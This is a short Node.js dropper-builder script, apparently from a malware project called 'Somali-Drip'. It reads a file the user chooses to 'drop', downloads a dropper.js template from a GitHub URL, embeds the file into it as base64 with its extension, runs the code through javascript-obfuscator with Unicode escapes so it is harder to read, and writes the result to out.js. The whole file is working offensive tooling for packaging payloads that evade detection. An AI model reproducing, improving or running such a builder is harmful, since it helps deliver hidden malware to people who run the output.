const JavaScriptObfuscator = require('javascript-obfuscator');
const fs = require('fs');
const https = require('https');
const prompt = require('prompt-sync')();


var file = prompt("Enter the file for dropping: ");

var fileData = fs.readFileSync(file);


async function getCode() {
    try {
        const res = await new Promise((resolve, reject) => {
            https.get("https://raw.githubusercontent.com/Somali-Devs/Somali-Drip/main/src/static/dropper.js", (res) => {
                let data = '';
                res.on('data', (chunk) => {
                    data += chunk;
                });
                res.on('end', () => {
                    resolve(data);
                });
            }).on('error', (err) => {
                reject(err);
            });
        });
        return res;
    } catch (err) {
        console.error(err);
        return "";
    }
}

async function main() {
    var code = await getCode();
    code = code.replace("YOUR_FILE_ENDING_HERE", file.split(".")[1]);
    code = code.replace("BASE64ENCODEDSTUFFHERE", fileData.toString("base64"));

    var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
        compact: true,
        simplify: true,
        target: 'node',
        unicodeEscapeSequence: true
    });

    fs.writeFileSync("out.js", obfuscationResult.getObfuscatedCode(), "utf8");
    //fs.writeFileSync("out.js", code, "utf8");
}

main();